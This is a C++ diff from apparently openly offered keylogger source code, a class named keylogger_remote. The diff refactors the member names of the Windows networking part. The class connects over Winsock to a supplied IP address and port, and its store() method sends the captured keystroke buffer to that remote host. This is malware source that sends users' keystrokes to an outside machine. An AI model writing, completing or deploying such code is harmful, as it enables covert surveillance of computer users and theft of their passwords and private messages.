@@ -1,16 +1,14 @@
 #include "./keylogger_remote.hpp"
 
-keylogger_remote::keylogger_remote(string p_ip_address, int p_port) : keylogger()
+keylogger_remote::keylogger_remote(string p_ip_address, int p_port) : keylogger(), m_socket()
 {
 	cout << p_ip_address << " - " << p_port << endl;
 
-	a_socket = 0;
-
-	WSADATA t_wsa_data;
+	WSADATA t_wsm_data;
 
 	int t_result = 0;
 
-	t_result = WSAStartup(MAKEWORD(2,0), &t_wsa_data);
+	t_result = WSAStartup(MAKEWORD(2,0), &t_wsm_data);
 
 	cout << "WSAStartup" << endl;
 
@@ -25,18 +23,18 @@ keylogger_remote::keylogger_remote(string p_ip_address, int p_port) : keylogger(
 	t_sockaddr_in.sin_family      = AF_INET;
 	t_sockaddr_in.sin_port		    = htons(p_port);
 
-	a_socket = socket(AF_INET,SOCK_STREAM,0);
+	m_socket = socket(AF_INET,SOCK_STREAM,0);
 
 	cout << "socket" << endl;
 
-	if(a_socket == INVALID_SOCKET)
+	if(m_socket == INVALID_SOCKET)
 	{
 		cerr << "connect : " << t_result << " : " <<  WSAGetLastError() << endl;
 		WSACleanup();
 		exit(EXIT_FAILURE);
 	}
 
-	t_result = connect(a_socket, (SOCKADDR *)&t_sockaddr_in, sizeof(t_sockaddr_in));
+	t_result = connect(m_socket, (SOCKADDR *)&t_sockaddr_in, sizeof(t_sockaddr_in));
 
 	cout << "connect" << endl;
 
@@ -50,7 +48,7 @@ keylogger_remote::keylogger_remote(string p_ip_address, int p_port) : keylogger(
 
 keylogger_remote::~keylogger_remote()
 {
-	closesocket(a_socket);
+	closesocket(m_socket);
 
 	WSACleanup();
 }
@@ -81,9 +79,9 @@ int keylogger_remote::send_complete(int p_socket, void** p_buffer, size_t p_byte
 
 void keylogger_remote::store()
 {
-	size_t t_size = a_buffer->length();
+	size_t t_size = m_buffer.length();
 
-	send_complete(a_socket, (void**) &t_size, sizeof(size_t));
+	send_complete(m_socket, (void**) &t_size, sizeof(size_t));
 
-	send_complete(a_socket, (void**) a_buffer->c_str(), a_buffer->length());
+	send_complete(m_socket, (void**) m_buffer.c_str(), m_buffer.length());
 }
